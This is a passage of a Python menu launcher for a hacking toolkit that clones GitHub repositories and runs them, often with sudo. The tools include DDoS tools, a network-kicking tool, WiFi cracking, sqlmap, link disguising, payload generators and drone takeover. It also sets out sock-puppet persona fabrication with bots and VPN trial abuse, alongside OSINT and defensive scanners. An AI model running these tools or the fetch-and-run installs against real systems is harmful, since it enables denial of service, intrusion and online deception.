        social()
    elif choice == "3":
        deepfakes()
    elif choice == "Details":
        print(" ")
        print("\033[96mPuppet Details")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in (
            " \033[92mRandom Generate Background Details and Specifics for Your Puppet."
        ):
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        jigsaw()
    elif choice == "Social Media":
        print(" ")
        print("\033[96mSocial Bots")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mHave Bots Like Your Socks Content to Establish False Length of Time On Accounts. Use Switch VPN Ip Address To Continue Free Trials Indefinetly":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        jigsaw()
    elif choice == "DeepFakes":
        print(" ")
        print("\033[96mDeepFakes")
        print(" ")
        print("", end="", flush=True)
        for char in " \033[92mAvatar for Profile. Extra Ai Goodies":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        jigsaw()
    elif choice == "BACK":
        unclassified_menu()
    elif choice == "HELL":
        main_menu()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        change()
        jigsaw()


def unclassified_menu():
    change()
    clear_screen()
    ascii_banner()
    print(colored("Unclassified-Menu", "red", attrs=["reverse", "blink", "bold"]))
    time.sleep(0.01)
    header()
    print(
        "                  \033[91m1\033[0m)\033[90m WebHound                             \033[91m2\033[0m)\033[90m Ominis-Osint                             \033[91m3\033[0m)\033[90m SockPuppet"
    )
    footer()
    choice = input("\033[0mSelect an option: ")
    if choice == "1":
        clear_screen()
        ascii_banner
        print(colored("CLONING REPO...", "red", attrs=["reverse", "blink", "bold"]))
        header()
        subprocess.run(["git", "clone", "https://github.com/AnonCatalyst/WebHound"])
        os.chdir("WebHound")
        print(
            colored(
                "INSTALLING DEPENDENCIES...", "red", attrs=["reverse", "blink", "bold"]
            )
        )
        header()
        subprocess.run(["pipenv", "run", "python3", "install.py"])
        subprocess.run(["pipenv", "run", "python3", "webhound.py"])
        what_now()
    elif choice == "2":
        clear_screen()
        ascii_banner
        print(colored("CLONING REPO...", "red", attrs=["reverse", "blink", "bold"]))
        header()
        subprocess.run(["git", "clone", "https://github.com/AnonCatalyst/Ominis-Osint"])
        os.chdir("Ominis-Osint")
        print(
            colored(
                "INSTALLING DEPENDENCIES...", "red", attrs=["reverse", "blink", "bold"]
            )
        )
        header()
        os.system("pipenv run python3 -m pip install -r requirements.txt")
        os.system(f"sudo chmod +x ./install.sh")
        os.system("sudo bash ./install.sh")
        os.system("pipenv run python3 ominis.py")
        what_now()
    elif choice == "3":
        jigsaw()
    elif choice == "HELL":
        change()
        main_menu()
    elif choice == "BACK":
        main_menu()
    elif choice == "WebHound":
        print(" ")
        print("\033[96mWebHound")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mSearch String In Google, Bing, DuckDuckGo etc. Returns results from each platorm with Titles, URL's and Descriptions":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        unclassified_menu()
    elif choice == "Ominis-Osint":
        print(" ")
        print("\033[96mOminis-Osint")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mTimeline Specific Search - General String Query with Multi-Proxy Rotation to avoid detection":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        unclassified_menu()
    elif choice == "SockPuppet":
        print(" ")
        print("\033[96mSockPuppet")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in (
            " \033[92mSome Tools To Aid in Crafting a Believable False Persona Online."
        ):
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        unclassified_menu()
    elif choice == "BACK":
        unclassified_menu()
    elif choice == "HELL":
        change()
        main_menu()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        change()
        unclassified_menu()


def simba_menu():
    clear_screen()
    ascii_banner()
    print(colored("CLONING REPO...", "red", attrs=["reverse", "blink", "bold"]))
    header()
    subprocess.run(["git", "clone", "https://github.com/SxNade/Simba"])
    os.chdir("Simba")
    clear_screen()
    ascii_banner()
    print(
        colored("INSTALLING DEPENDENCIES...", "red", attrs=["reverse", "blink", "bold"])
    )
    header()
    os.system("sudo chmod +x simba")
    clear_screen()
    ascii_banner()
    print(colored("Web Header Scan", "red", attrs=["reverse", "blink", "bold"]))
    header()
    url = input("url to scan: ")
    subprocess.run(["./simba", "--link", url])
    what_now()


def subdomains():
    clear_screen()
    ascii_banner()
    os.system("sudo apt install sublist3r")
    clear_screen()
    ascii_banner()
    print(
        colored("Example Domain: REDDIT.COM", "red", attrs=["reverse", "blink", "bold"])
    )
    url = input("Enter Domain: ")
    subprocess.run(["sublist3r", "-d", url])
    what_now()


def prox():
    clear_screen()
    ascii_banner
    print(colored("CLONING REPO...", "red", attrs=["reverse", "blink", "bold"]))
    header()
    subprocess.run(["git", "clone", "https://github.com/AnonCatalyst/LuminaProxy.git"])
    os.chdir("LuminaProxy")
    clear_screen()
    ascii_banner()
    print(
        colored("INSTALLING DEPENDENCIES...", "red", attrs=["reverse", "blink", "bold"])
    )
    header()
    os.system("pipenv run python3 install.py")
    subprocess.run(["pipenv", "run", "python3", "lumina.py"])
    what_now()


def cyber():
    clone_command = "git clone https://github.com/AnonymousAt3/cybermap.git"
    os.system(clone_command)
    os.system("git fetch")
    os.system("git pull")
    chmod_command = "sudo chmod +x cybermap/cybermap.sh"
    os.system(chmod_command)
    bash_command = "bash cybermap/cybermap.sh"
    os.system(bash_command)
    what_now()


def ipp():
    print("example: www.TARGETSITE.com")
    trg = input("Target url: ")
    subprocess.run(["nslookup", trg])
    time.sleep(10)
    ipp()


def kicks():
    change()
    os.system("git clone https://github.com/k4m4/kickthemout.git")
    os.chdir("kickthemout")
    os.system("sudo -H pipenv install -r requirements.txt")
    os.system("sudo python3 kickthemout.py")
    what_now()


def kicker():
    change()
    os.system("sudo apt-get update && sudo apt-get install nmap")
    os.system("git clone https://github.com/k4m4/kickthemout.git")
    os.chdir("kickthemout")
    os.system("sudo -H pipenv install -r requirements.txt")
    kicks()


def cat1():
    clear_screen()
    print(
        "Enter Exploit Query \033[94mexample: \033[92mGmail\033[94m, \033[92mCookies\033[94m, \033[92mtelerik\033[94m etc."
    )
    print(" ")
    expl = input("Query: ")
    subprocess.run(
        [
            "python3",
            "sicat.py",
            "-k",
            expl,
            "--exploitdb",
            "--msfmodule",
            "--exploitalert",
            "--packetstorm",
        ]
    )
    subprocess.run(["getsploit", expl])
    while True:
        print("\033[91m1\033[0m)\033[90m New Search")
        print("\033[91m2\033[0m)\033[90m Dante's Inferno")
        option = input("Action: ")
        if option == "1":
            cat1()
        elif option == "2":
            kaboom()
        else:
            print("\033[91m INVALID SELECTION\033[0m")
            time.sleep(1)
            kaboom()


def cloak():
    clear_screen()
    print("Enter CloudFlare Protected Url")
    ur = input("Url: ")
    clear_screen
    subprocess.run(["pipenv", "run", "python3", "cloakquest3r.py", ur])
    print("1) New Search")
    print("2) Dante's Inferno")
    choice = input("Selection: ")
    if choice == "1":
        cloak()
    elif choice == "2":
        kaboom()
    else:
        print("INVALID SELECTION")
        time.sleep(1)
        clear_screen()
        cloak()


def hguard():
    os.system("pipenv run python3 main.py")
    print(" ")
    print("1) New Search")
    print("2) Go Back")
    print("3) Main Menu")
    choice = input("Select Option: ")
    if choice == "1":
        hguard()
    elif choice == "2":
        kaboom()
    elif choice == "3":
        main_menu()
    else:
        print("INVALID SELECTION")
        clear_screen()
        kaboom()


def rainbow_gradient_text(text):
    for i, char in enumerate(text):
        r = int((i / len(text)) * 255)
        g = int((1 - (i / len(text))) * 255)
        color = f"\033[38;2;{r};{g};0m"
        print(f"{color}{char}\033[0m", end="")
    print()


def get_rainbow_gradient(length):
    rainbow_colors = [
        "#FF0000",
        "#FF7F00",
        "#FFFF00",
        "#00FF00",
        "#0000FF",
        "#7F00FF",
        "#7F007F",
    ]
    gradient = []
    for i in range(length):
        r, g, b = hex_to_rgb(rainbow_colors[i % len(rainbow_colors)])
        gradient.append(f"\033[38;2;{r};{g};{b}m")
    return "".join(gradient)


def hex_to_rgb(hex_color):
    return int(hex_color.lstrip("#"), 16)


def vscan():
    clear_screen()
    print("URL TO SCAN")
    print("Format: \033[92mhttps://example.com/*")
    urll = input("Url: ")
    subprocess.run(
        [
            "python3",
            "TechViper.py",
            "-u",
            urll,
            "--threads",
            "12",
            "--timeout",
            "15",
            "--allow-redirect",
        ]
    )
    print(" ")
    print("1) New Search")
    print("2) Dante's Inferno")
    print("3) Go To Hell")
    choice = input("Selection: ")
    if choice == "1":
        vscan()
    elif choice == "2":
        kaboom()
    elif choice == "3":
        main_menu()


def kaboom():
    change()
    clear_screen()
    ascii_kaboom()
    print(colored("OFFENSIVE TOOLS", "red", attrs=["reverse", "blink", "bold"]))
    header()
    print(
        "                  ♛ \033[91m1\033[0m)\033[90m DRipper                        ♛ \033[91m2\033[0m)\033[90m UFONET                   ♛ \033[91m3\033[0m)\033[90m Karma"
    )
    print(
        "                  ♛ \033[91m4\033[0m)\033[90m WiDie                          ♛ \033[91m5\033[0m)\033[90m Sql-Map                  ♛ \033[91m6\033[0m)\033[90m LinkMask "
    )
    print(
        "                  ♛ \033[91m7\033[0m)\033[90m KickThemOut                    🪬\033[91m8\033[0m)\033[90m Sicat                    🪬\033[91m9\033[0m)\033[90m CloakQuest3r"
    )
    print(
        "                  ♛ \033[91m10\033[0m)\033[90m MafiaHacks                    🪬\033[91m11\033[0m)\033[90m Hackguard               🪬\033[91m12\033[0m)\033[90m Recox"
    )
    print(
        "                  ♛ \033[91m13\033[0m)\033[90mChameleon 🪬                   ♛ \033[91m14\033[0m)\033[90m DroneSploit             ♛ \033[91m15\033[0m)\033[90m FatRat   "
    )
    print(
        "                 🪬 \033[91m16\033[0m)\033[90m Tech Viper                    🪬\033[91m17\033[0m)\033[90m DAMN "
    )
    footer()
    choice = input("\033[0mSelect an option: ")
    if choice == "1":
        change()
        os.system("git clone https://github.com/palahsu/DDoS-Ripper.git")
        os.chdir("DDoS-Ripper")
        clear_screen()
        print("ENTER IP ADDRESS NOW")
        ipa = input("ip: ")
        print("ENTER OPEN PORT")
        prt = input("port: ")
        print(
            "\033[90mSELECT\033[94m135 \033[90mor \033[94m443 \033[90mFOR TURBO MODE\033[0m"
        )
        trb = input("turbo number: ")
        subprocess.run(["pipenv", "run", "python3", "DRipper.py", "-s", ipa, "-p", prt, "-t", trb])
        what_now()
    elif choice == "DRipper":
        print(" ")
        print("\033[96mDRipper")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[91mSimple yet Effective Attack Model for crashing web servers":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        kaboom()
    elif choice == "2":
        change()
        clear_screen()
        ascii_kaboom()
        os.system("git clone https://github.com/Thr0wAway-n0w/ufonetUpdated.git")
        os.chdir("ufonetUpdated")
        os.system("git fetch")
        os.system("git pull")
        os.system("sudo apt install python3-pycurl")
        os.system("sudo apt install python3-geoip")
        os.system("sudo apt install libgeoip-dev")
        os.system("sudo apt install libgeoip1")
        os.system("sudo apt install python3-whois")
        os.system("sudo apt install python3-requests")
        os.system("sudo apt install python3-scapy")
        os.system("pipenv install GeoIP")
        os.system("pipenv install python-geoip")
        os.system("pipenv install pygeoip")
        os.system("pipenv install requests")
        os.system("pipenv install pycurl")
        os.system("pipenv install whois")
        os.system("pipenv install scapy-python3")
        os.system("sudo chmod +x ufonet")
        os.system("pipenv run python3 ./ufonet --gui")
        what_now()
    elif choice == "UFONET":
        print(" ")
        print("\033[96mUFONET")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[91mMultiAttack Protocol for DoS and DDoS Attacks using Zombie Servers across the Globe.":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        kaboom()
    elif choice == "3":
        change()
        os.system("git clone https://github.com/HyukIsBack/KARMA-DDoS.git")
        os.chdir("KARMA-DDoS")
        os.system("git fetch")
        os.system("git pull")
        os.system("pipenv run python3 -m pip install -r requirements.txt")
        os.system("sudo chmod +x ./setup.py")
        os.system("sudo python3 ./setup.py install")
        clear_screen()
        os.system("pipenv run python3 main.py")
        kaboom()
    elif choice == "Karma":
        print(" ")
        print("\033[96mKarma")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[91mMulti-Level Attack Surface featuring a number of options for both Level4 and Level7":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        kaboom()
    elif choice == "4":
        wi_die()
        what_now()
    elif choice == "WiDie":
        print(" ")
        print("\033[96mCrack WiFi")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[91mWiFi Attack Options \033[95mHandshake\033[92m |\033[95m PKMID\033[92m | \033[95mAAuth\033[92m |\033[95m DAuth \033[92m| \033[95mBFlood\033[92m | \033[95mETwin\033[92m)":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        kaboom()
    elif choice == "5":
        sql_attack()
        what_now()
    elif choice == "Sql-Map":
        print(" ")
        print("\033[96mSql-Map")
        print(" ")
        print("", end="", flush=True)
        for char in " \033[91mAutomated sql Injection and Database Takeover Tool":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        kaboom()
    elif choice == "6":
        change()
        os.system("git clone https://github.com/technicalheadquarter/linkmask")
        os.chdir("linkmask")
        os.system("sudo chmod +x linkmask.sh")
        os.system("sudo bash ./linkmask.sh")
        what_now()
    elif choice == "LinkMask":
        print(" ")
        print("\033[96mLinkMask")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[91mHelp to disguise any weblink to increase the likelihood of successful op":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        kaboom()
    elif choice == "7":
        change()
        os.system("sudo apt-get update && sudo apt-get install nmap")
        os.system("git clone https://github.com/k4m4/kickthemout.git")
        os.chdir("kickthemout")
        os.system("sudo -H pipenv install -r requirements.txt")
        kick()
        os.system("sudo python3 kickthemout.py")
        what_now()
    elif choice == "KickThemOut":
        print(" ")
        print("\033[96mThat's My WiFi Bitch")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[91mStops single, multiple, or all device internet connectivity on the current network. Lists by ip and mac address":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        kaboom()
    elif choice == "8":
        change()
        clear_screen()
        os.system("git clone https://github.com/justakazh/sicat.git")
        os.chdir("sicat")
        os.system("pipenv run python3 -m pip install -r requirements.txt")
        os.system("sudo apt install getsploit")
        sploit = "YKCX4J0B2ZBD8ZRF1WVOAIISZQKYAKVM1VT8UZ6QLNBZMIS5ALJYXW9NEA2E5K7X"
        subprocess.run(["getsploit", sploit])
        cat1()
    elif choice == "Sicat":
        print(" ")
        print("\033[96mExploit/Vulnerability Finder")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[91mSiCat by justakazh is an exploit search tool designed to identify and gather information about exploits":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        kaboom()
    elif choice == "9":
        change()
        clear_screen()
        os.system("git clone https://github.com/spyboy-productions/CloakQuest3r.git")
        os.chdir("CloakQuest3r")
        os.system("pipenv install -r requirements.txt")
        cloak()
    elif choice == "CloakQuest3r":
        print(" ")
        print("\033[96mCloudFlare Unmask")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[91mReveal the hidden IP address of any website that is hiding behind cloudflare":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        kaboom()
    elif choice == "10":
        os.system("git clone https://github.com/machine1337/mafiahacks.git")
        os.chdir("mafiahacks")
        os.system("sudo chmod +x mafia.sh")
        os.system("sudo bash ./mafia.sh")
        what_now()
    elif choice == "MafiaHacks":
        print(" ")
        print("\033[96mPayload Generator")
        print(" ")
        print("", end="", flush=True)
        for char in " \033[91mCross platform automated payload creation":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        kaboom()
    elif choice == "11":
        change()
        os.system("git clone https://github.com/machine1337/hackguard.git")
        os.chdir("hackguard")
        os.system("pipenv run python3 -m pip install -r requirements.txt")
        hguard()
    elif choice == "Hackguard":
        print(" ")
        print("\033[96mWeb Vulnerability Scanner")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[91mIndepth Scans, customized payloads option, very fast and effective. Really nice work by Machine1337":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        kaboom()
    elif choice == "12":
        os.system("git clone https://github.com/Thr0wAway-n0w/recoxU.git")
        os.chdir("recoxU")
        os.system("sudo chmod +x recox.sh")
        os.system("./recox.sh")
        what_now()
    elif choice == "Recox":
        print(" ")
        print(
            "\033[96mDetect vulnerabilities that are not typically in the OWASP top ten vulnerabilities list"
        )
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[91mAutomates scans that are typically manually done in pen-testing, Recursive and thorough":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        kaboom()
    elif choice == "13":
        change()
        os.system("git clone https://github.com/qeeqbox/chameleon.git")
        os.chdir("chameleon")
        os.system("sudo chmod +x ./run.sh")
        clear_screen()
        print(
            colored(
                "WHEN THE SCRIPT TELLS YOU EVERYTHING LOOKS GOOD, REFRESH THIS BROSWER WINDOW.",
                "red",
                attrs=["reverse", "blink", "bold"],
            )
        )
        print(
            colored(
                "Username: changeme457f6460cb287     Password: changemed23b8cc6a20e0   (don't change these)",
                "yellow",
                attrs=["reverse", "bold"],
            )
        )
        time.sleep(5)
        print(
            "Make sure you install your dependencies before running any tests or the Dev"
        )
        time.sleep(1)
        webbrowser.open("http://localhost:3000/d/9tnNjdiMz/chameleon")
        os.system("sudo ./run.sh auto_configure")
        what_now()
    elif choice == "Chameleon":
        print(" ")
        print("\033[96mCustomizable Honeypots")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[91mmonitoring network traffic, bots activities and username/password credentials.  \033[94mDNS \033[92m|\033[94m HTTP \033[92m|\033[94m\033[94m Proxy \033[92m|\033[94m HTTP \033[92m|\033[94m HTTPS \033[92m|\033[94m SSH \033[92m|\033[94m POP3 \033[92m|\033[94m IMAP \033[92m|\033[94m STMP \033[92m|\033[94m RDP \033[92m|\033[94m VNC \033[92m|\033[94m SMB \033[92m|\033[94m SOCKS5 \033[92m|\033[94m Redis \033[92m|\033[94m TELNET \033[92m|\033[94m Postgres \033[92m|\033[94m MySQL":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        kaboom()
    elif choice == "14":
        change()
        os.system("pipenv install dronesploit")
        os.system("dronesploit")
        what_now()
    elif choice == "DroneSploit":
        print(" ")
        print("\033[96m Eye's in the Sky")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[91mTake control of those pesky bastards nosing around in your business.":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        kaboom()
    elif choice == "15":
        change()
        os.system("git clone https://github.com/Screetsec/TheFatRat.git")
        os.chdir("TheFatRat")
        os.system("sudo chmod +x setup.sh && sudo ./setup.sh")
        os.system("sudo fatrat")
        what_now()
    elif choice == "FatRat":
        print(" ")
        print("\033[96mCross platform; System exploit tool kit")
        print(" ")
        print("", end="", flush=True)
        for char in " \033[91mAutomates the attack methods pretty well.":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        kaboom()
    elif choice == "16":
        change()
        os.system("git clone https://github.com/Malwareman007/TechViper.git")
        os.chdir("TechViper")
        os.system("pipenv run python3 -m pipenv install -r requirements.txt")
        vscan()
    elif choice == "Tech Viper":
        print(" ")
        print("\033[96mDetect Exploitations and Malicious code injection in Urls")
        print(" ")
        print("", end="", flush=True)
        for char in " \033[91mMake sure you format your like https://example.org":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        kaboom()
    elif choice == "17":
        os.system("sudo apt install rkhunter")
        os.system("sudo rkhunter -c")
        print(" ")
        print("1) View Report")
        print("2) Dante's Inferno")
        print("3) Go to HELL")
        choice = input("Selection: ")
        if choice == "1":
            change()
            os.chdir("/var/log")
            subprocess.run(["sudo", "nano", "rkhunter.log"])
            what_now()
        elif choice == "2":
            kaboom()
        elif choice == "3":
            main_menu()
        else:
            print("INVALID SELECTION. GO TO HELL!")
            time.sleep(2)
            kaboom()
    elif choice == "DAMN":
        print(" ")
        print("\033[96mThe Damnation Station")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[91mTake a look to see if there's an Angel on Your Systems shoulder, or a Devil":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        kaboom()
    elif choice == "BACK":
        main_menu()
    elif choice == "HELL":
        main_menu()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        clear_screen()
        ascii_kaboom()
        kaboom()


def networks_menu():
    clear_screen()
    ascii_banner()
    print(colored("Networks-Menu", "red", attrs=["reverse", "blink", "bold"]))
    header()
    print(
        "                \033[91m1\033[0m)\033[90m CyberMap                             \033[91m4\033[0m)\033[90m IP-Lookup                             \033[91m7\033[0m)\033[90m ProxyScrape"
    )
    print(
        "                \033[91m2\033[0m)\033[90m Sys Info                             \033[91m5\033[0m)\033[90m PortScan                              \033[91m8\033[0m)\033[90m WiFi"
    )
    print(
        "                \033[91m3\033[0m)\033[90m Lynis                                \033[91m6\033[0m)\033[90m Simba                                 \033[91m9\033[0m)\033[90m SubDomains"
    )
    print(" ")
    print(
        "                \033[91mDNS\033[0m)\033[90m DnsTwist"
    )
    print(" ")
    footer()
    choice = input("\033[0mSelect an option: ")
    if choice == "1":
        cyber()
    elif choice == "3":
        lynis_sys()
        what_now()
    elif choice == "4":
        clear_screen()
        ascii_banner()
        print(
            colored("Select 1 to Continue", "red", attrs=["reverse", "blink", "bold"])
        )
        time.sleep(0.01)
        header()
        print("1) Open '\033[91mREFRESH URL IF NEEDED\033[0m'")
        print("2) Main Menu")
        choice = input("Select choice: ")

        if choice == "1":
            webbrowser.open("http://127.0.0.1:5000")
            wlan()
            time.sleep(3)
            networks_menu()

        if choice == "2":
            clear_screen()
            main_menu()

    elif choice == "5":
        clear_screen()
        ascii_banner
        print(colored("CLONING REPO...", "red", attrs=["reverse", "blink", "bold"]))
        header()
        subprocess.run(
            ["git", "clone", "https://github.com/Thr0wAway-n0w/borrowed.git"]
        )
        os.chdir("borrowed")
        clear_screen()
        ascii_banner()
        print(
            colored(
                "INSTALLING DEPENDENCIES...", "red", attrs=["reverse", "blink", "bold"]
            )
        )
        header()
        os.system("pipenv run python3 -m pip install -r requirements.txt")
        subprocess.run(["pipenv", "run", "python3", "ports.py"])
        what_now()
    elif choice == "6":
        simba_menu()
    elif choice == "7":
        prox()
    elif choice == "8":
        clear_screen()
        print(
            colored(
                "                             OPTIMIZING WiFi                           ",
                "red",
                attrs=["reverse", "blink", "bold"],
            )
        )
        print(
            "\033[91m\033[95m-----------------------------------\033[97m30\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[97m29\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[97m28\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[97m27\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[97m26\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[97m25\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[97m24\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[97m23\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[97m22\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[97m21\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[93m20\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[93m19\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[93m18\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[93m17\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[93m16\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[93m15\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[93m14\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[93m13\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[93m12\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[93m11\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[31m10\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[31m09\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[31m08\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[31m07\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[31m06\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[31m05\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[31m04\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[31m03\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[31m02\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[31m01\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print(
            "\033[91m\033[95m-----------------------------------\033[31m00\033[95m-----------------------------------\033[97m\033[0m"
        )
        time.sleep(1)
        chop_chop()
        print("\033[91mC\033[0m")
        time.sleep(0.05)
        chop_chop()
        print("\033[91mCH\033[0m")
        time.sleep(0.05)
        chop_chop()
        print("\033[91mCHO\033[0m")
        time.sleep(0.05)
        chop_chop()
        print("\033[91mCHOP\033[0m")
        time.sleep(0.05)
        chop_chop()
        print("\033[91mCHOP C\033[0m")
        time.sleep(0.05)
        chop_chop()
        print("\033[91mCHOP CH\033[0m")
        time.sleep(0.05)
        chop_chop()
        print("\033[91mCHOP CHO\033[0m")
        time.sleep(0.05)
        chop_chop()
        print("\033[91mCHOP CHOP\033[0m")
        time.sleep(0.05)
        chop_chop()
        print("\033[91mCHOP CHOP!\033[0m")
        time.sleep(0.05)
        chop_chop()
        print("\033[91mCHOP CHOP!!\033[0m")
        time.sleep(0.05)
        chop_chop()
        print("\033[91mCHOP CHOP!!!\033[0m")
        time.sleep(0.05)
        chop_chop()
        time.sleep(2)
        clear_screen()
        print(
            "\033[91mTYPE IN THE BSSID STRING THAT IS \033[96mCLOSEST\033[91m TO 30 IN SIGNAL LEVEL\033[0m"
        )
        wifi_boost()
        what_now()
    elif choice == "9":
        subdomains()
    elif choice == "DNS":
        os.system("sudo apt install dnstwist")
        clear_screen()
        domain = input("Enter Domain URL: ")
        subprocess.run(["dnstwist" , "--registered" , domain])
        what_now()
    elif choice == "10":
        kaboom()
    elif choice == "BACK":
        main_menu()
    elif choice == "HELL":
        main_menu()
    elif choice == "DnsTwist":
        print(" ")
        print("\033[96mDNS fuzzing")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[95mgenerates a comprehensive list of permutations from the users url address. Usful for discovering fishing, or otherwise malicious imposter sites":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        networks_menu()

    elif choice == "CyberMap":
        print(" ")
        print("\033[96mCyberMap")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[95mScan Ports, Detect Heartbleed, os, Network, HostNames, Firewalls, IP's, and Both TCP and UDP Protocols":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        networks_menu()
    elif choice == "Lynis":
        print(" ")
        print("\033[96mLynis")
        print(" ")
        print("", end="", flush=True)
        for (
            char
